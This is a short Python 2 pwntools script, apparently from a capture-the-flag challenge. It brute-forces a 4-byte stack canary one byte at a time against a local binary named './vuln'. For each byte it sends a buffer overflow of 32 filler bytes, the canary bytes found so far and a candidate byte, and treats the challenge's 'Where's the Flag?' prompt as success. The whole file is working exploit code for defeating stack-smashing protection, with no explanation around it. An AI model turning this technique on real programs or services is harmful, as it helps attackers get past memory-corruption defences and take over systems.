#!/usr/bin/python
from pwn import *
import sys


def find_canary(canary) :
    if len(canary) == 4 :
        return 1
    
    count = 0x00
    while count <= 0xff :
        conn = process("./vuln")

        conn.sendline(str(32 + len(canary) + 1))

        conn.read() 
        if canary != '' :
            conn.sendline("A" * 32 + canary + p8(count))
        else :
            conn.sendline("A" * 32 + p8(count))

        try :
            conn.readuntil("Ok... Now Where's the Flag?")

            if len(hex(count)) % 2 == 1 :
                return ("0" + hex(count)[2]).decode("hex"), hex(count)
            else :
                return (hex(count)[2:]).decode("hex"), hex(count)

        except : 
            print "Failed.."
            count += 1

            continue


def main() :
    
    canary = ''
    raw_string = ''
    while len(canary) != 4 :
        res, raw= find_canary(canary)
        canary += res
        raw_string += raw
        print canary
        print raw_string

    return


main()